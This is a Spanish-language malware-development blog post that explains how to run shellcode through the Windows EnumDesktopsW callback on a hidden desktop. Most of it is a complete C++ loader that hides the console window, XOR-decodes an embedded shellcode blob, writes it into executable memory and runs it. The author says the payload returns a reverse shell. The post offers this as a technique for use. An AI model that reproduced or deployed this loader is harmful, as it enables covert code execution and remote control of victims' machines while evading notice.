---
layout: post
title: Inyeccion de shellcodes via EnumDesktopsW()
author: c4rta
date: 2023-07-07
tags: [MalDev]
image: /assets/img/enumDesktopW/waifu.jpg
---
Te explicare como use la funcion ```EnumDesktopsW()``` para ejecutar una shellcode en un escritorio creado con ```CreateDesktopW()``` 
{:.lead}
## EnumDesktopsW

EnumDesktopsW es una funcion de la WinAPI la cual enumera todos los escritorios del usuario, cabe recalcar que solo enumera los cuales tengan acceso ```DESKTOP_ENUMERATE``` o ```GENERIC_ALL```, lo que hace por detras esta funcion es invocar multiples veces a la funcion callback del parámetro ```lpEnumFunc``` hasta que termine de enumerar todos los escritorios.

```lpEnumFunc``` es uno de los parametros que recibe ```EnumDesktopsW()```, este parametro es un puntero a la callback  ```DESKTOPENUMPROC```, su sintaxis es:

```c++
BOOL CALLBACK EnumDesktopProc(
  _In_ LPTSTR lpszDesktop,
  _In_ LPARAM lParam
);
```

### ¿Como se ejecuta la shellcode?

Basicamente hace esto:

- Se asigna un buffer de memoria mediante una función como VirtualAlloc
- Se copia la shellcode en la memoria recién asignada
- Se usa EnumDesktopsW para enumerar los escritorios y mediante una funcion callback encontrar la dirección de una función que se puede usar para ejecutar la shellcode (La direccion que regresa VirtualAlloc)

El codigo "base" para ejecutar una shellcode de esta forma tomando en cuenta la explicacion anterior, es:

```c++
HANDLE hAlloc = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(hAlloc, shellcode, sizeof(shellcode));
EnumDesktopsW(GetProcessWindowStation(),(DESKTOPENUMPROCW) hAlloc, NULL);
```

Pero nos vamos a poner experimentadores y te voy a explicar como usando ese mismo codigo de base lo converti en algo bien genial

### Explicacion

Como en los demas tutoriales, te pondre todo el codigo y te explicare que hacen las funciones y como se ejecuta la shellcode

```c++
#include <Windows.h>
#include <iostream>

unsigned char shellcode[] = {
	"\x92\x26\xed\x8a\x9e\x86\xa2\x6e\x6e\x6e\x2f\x3f\x2f\x3e"
	"\x3c\x3f\x26\x5f\xbc\x0b\x26\xe5\x3c\x0e\x26\xe5\x3c\x76"
	"\x38\x26\xe5\x3c\x4e\x23\x5f\xa7\x26\xe5\x1c\x3e\x26\x61"
	"\xd9\x24\x24\x26\x5f\xae\xc2\x52\x0f\x12\x6c\x42\x4e\x2f"
	"\xaf\xa7\x63\x2f\x6f\xaf\x8c\x83\x3c\x26\xe5\x3c\x4e\xe5"
	"\x2c\x52\x2f\x3f\x26\x6f\xbe\x08\xef\x16\x76\x65\x6c\x61"
	"\xeb\x1c\x6e\x6e\x6e\xe5\xee\xe6\x6e\x6e\x6e\x26\xeb\xae"
	"\x1a\x09\x26\x6f\xbe\xe5\x26\x76\x3e\x2a\xe5\x2e\x4e\x27"
	"\x6f\xbe\x8d\x38\x23\x5f\xa7\x26\x91\xa7\x2f\xe5\x5a\xe6"
	"\x26\x6f\xb8\x26\x5f\xae\xc2\x2f\xaf\xa7\x63\x2f\x6f\xaf"
	"\x56\x8e\x1b\x9f\x22\x6d\x22\x4a\x66\x2b\x57\xbf\x1b\xb6"
	"\x36\x2a\xe5\x2e\x4a\x27\x6f\xbe\x08\x2f\xe5\x62\x26\x2a"
	"\xe5\x2e\x72\x27\x6f\xbe\x2f\xe5\x6a\xe6\x26\x6f\xbe\x2f"
	"\x36\x2f\x36\x30\x37\x34\x2f\x36\x2f\x37\x2f\x34\x26\xed"
	"\x82\x4e\x2f\x3c\x91\x8e\x36\x2f\x37\x34\x26\xe5\x7c\x87"
	"\x25\x91\x91\x91\x33\x27\xd0\x19\x1d\x5c\x31\x5d\x5c\x6e"
	"\x6e\x2f\x38\x27\xe7\x88\x26\xef\x82\xce\x6f\x6e\x6e\x27"
	"\xe7\x8b\x27\xd2\x6c\x6e\x7f\x32\xae\xc6\x6f\x27\x2f\x3a"
	"\x27\xe7\x8a\x22\xe7\x9f\x2f\xd4\x22\x19\x48\x69\x91\xbb"
	"\x22\xe7\x84\x06\x6f\x6f\x6e\x6e\x37\x2f\xd4\x47\xee\x05"
	"\x6e\x91\xbb\x04\x64\x2f\x30\x3e\x3e\x23\x5f\xa7\x23\x5f"
	"\xae\x26\x91\xae\x26\xe7\xac\x26\x91\xae\x26\xe7\xaf\x2f"
	"\xd4\x84\x61\xb1\x8e\x91\xbb\x26\xe7\xa9\x04\x7e\x2f\x36"
	"\x22\xe7\x8c\x26\xe7\x97\x2f\xd4\xf7\xcb\x1a\x0f\x91\xbb"
	"\xeb\xae\x1a\x64\x27\x91\xa0\x1b\x8b\x86\xfd\x6e\x6e\x6e"
	"\x26\xed\x82\x7e\x26\xe7\x8c\x23\x5f\xa7\x04\x6a\x2f\x36"
	"\x26\xe7\x97\x2f\xd4\x6c\xb7\xa6\x31\x91\xbb\xed\x96\x6e"
	"\x10\x3b\x26\xed\xaa\x4e\x30\xe7\x98\x04\x2e\x2f\x37\x06"
	"\x6e\x7e\x6e\x6e\x2f\x36\x26\xe7\x9c\x26\x5f\xa7\x2f\xd4"
	"\x36\xca\x3d\x8b\x91\xbb\x26\xe7\xad\x27\xe7\xa9\x23\x5f"
	"\xa7\x27\xe7\x9e\x26\xe7\xb4\x26\xe7\x97\x2f\xd4\x6c\xb7"
	"\xa6\x31\x91\xbb\xed\x96\x6e\x13\x46\x36\x2f\x39\x37\x06"
	"\x6e\x2e\x6e\x6e\x2f\x36\x04\x6e\x34\x2f\xd4\x65\x41\x61"
	"\x5e\x91\xbb\x39\x37\x2f\xd4\x1b\x00\x23\x0f\x91\xbb\x27"
	"\x91\xa0\x87\x52\x91\x91\x91\x26\x6f\xad\x26\x47\xa8\x26"
	"\xeb\x98\x1b\xda\x2f\x91\x89\x36\x04\x6e\x37\x27\xa9\xac"
	"\x9e\xdb\xcc\x38\x91\xbb"
};

typedef BOOL(WINAPI* ShellcodeFunction)(LPCWSTR, LPARAM);

DWORD WINAPI SwitchDesktopThread(LPVOID lpParameter){
    HDESK hDesktop = static_cast<HDESK>(lpParameter);
    SetThreadDesktop(hDesktop);
    
    return 0;
}

int main(){
	HWND hWin = GetConsoleWindow();
	ShowWindow(hWin, SW_HIDE);
	
    HDESK hDesktop = CreateDesktopW(L"ShellcodeDesk", NULL, NULL, 0, GENERIC_ALL, NULL);
    if (hDesktop != NULL){
        HANDLE hThread = CreateThread(NULL, 0, SwitchDesktopThread, hDesktop, 0, NULL);
        if (hThread == NULL){
            CloseDesktop(hDesktop);
            return 1;
        }else{
        	CloseHandle(hThread);
	
	        for (int i = 0; i < sizeof(shellcode); i++){
	            shellcode[i] = (byte)(shellcode[i] ^ (byte)'\x6e');
	        }
	
	        const size_t shellcodeSize = sizeof(shellcode);
	
	        LPVOID hAlloc = VirtualAlloc(
	            NULL,
	            shellcodeSize,
	            MEM_COMMIT | MEM_RESERVE,
	            PAGE_EXECUTE_READWRITE
	        );
	
	        memcpy(hAlloc, shellcode, shellcodeSize);
	        EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)hAlloc, NULL);
	        CloseDesktop(hDesktop);
		}

    }
    return 0;
}
```

### Explicacion rapida

Se crea un hilo para ejecutar ```SwitchDesktopThread()```, asi que cuando se ejecute esa funcion cambiara al escritorio mediante ```SetThreadDesktop()```, ese escritorio se llama "ShellcodeDesk" creado con ```CreateDesktop()```, permitiendo que esa accion ocurra en segundo plano en ese hilo que se creo, despues se reserva memoria con ```VirtualAlloc()``` para la shellcode y se inyectara en el contexto del escritorio "ShellcodeDesk" mediante la funcion de callback ```EnumDesktopW()```, permitiento asi que el escritorio actual del usuario no este ocurriendo nada, y todo el proceso de la shellcode se este ejecutando en el escritorio "ShellcodeDesk"


### Explicacion de cada funcion

#### CreateDesktopW()

```c++
HDESK hDesktop = CreateDesktopW(L"ShellcodeDesk", NULL, NULL, 0, GENERIC_ALL, NULL);
```

Creara un nuevo escritorio llamado "ShellcodeDesk" donde se le da acceso "GENERIC_ALL" para tener control total de ese ecritorio, y ojo,
para windows los escritorios solo son objetos que representan un area virtual la cual ejecuta aplicaciones y tiene ventanas, cada escritorio
esta aislado de otro escritorio, es decir, que cada escritorio tiene sus ventanas, aplicaciones.

Como curiosidad, la creacion de escritorios esta limitada por el tamaño del heap del escritorio del sistema, el cual es de 48 MB

Y si ese escritorio se crea, osea es diferente de NULL, regresa un identificador que se guarda en ```hDesktop```, y pasara a la funcion CreateThread()

#### CreateThread()

```c++
HANDLE hThread = CreateThread(NULL, 0, SwitchDesktopThread, hDesktop, 0, NULL);
```

Ahora, cuando se hace un llamado a esta funcion lo que esta pasando es que crea un hilo en el proceso actual, y date cuenta que este hilo su tercer parametro es un puntero del nombre de la funcion que se va a ejecutar en ese hilo, osea ```SwitchDesktopThread```, tambien se le pasa ```hDesktop``` que es la variable que tiene el escritorio creado con ```CreateDesktopW()```

#### SwitchDesktopThread()

```c++
DWORD WINAPI SwitchDesktopThread(LPVOID lpParameter){
    HDESK hDesktop = static_cast<HDESK>(lpParameter);
    SetThreadDesktop(hDesktop);
    
    return 0;
}
```

Ahora con ```SwitchDesktopThread``` lo que esta haciendo es cambiar al escritorio creado con ```CreateDesktopW()``` mediante ```SetThreadDesktop()```, sin embargo este cambio lo hace asignando el escritorio creado al hilo al que pertenece o del cual se esta ejecutando, osea, el escritorio "ShellcodeDesk" que se creo con ```CreateDesktopW()``` se estaria ejecutando en el hilo creado con ```CreateThread```, por eso mismo, en uno de los parametros de ```CreateThread``` se le pasa ```hDesktop```, que es la variable que tiene el nombre de escritorio "ShellcodeDesk".

#### Ejecucion de la shellcode

Y en caso de que todo vaya bien todas las intrucciones que le siguen se estarian ejecutando en ese escritorio ("ShellcodeDesk") lo cual permite que esten aisladas del escritorio actual del usuario, y ya al final con ```EnumDesktopsW()``` se ejecuta las shellcode en el contexto del escritorio creado, osea ShellcodeDesk

#### Resultados

Llega una reverse shell por que eso es lo que hace la shellcode

![](/assets/img/enumDesktopW/1.png)

![](/assets/img/enumDesktopW/2.png)

Eso ha sido todo, gracias por leer ❤
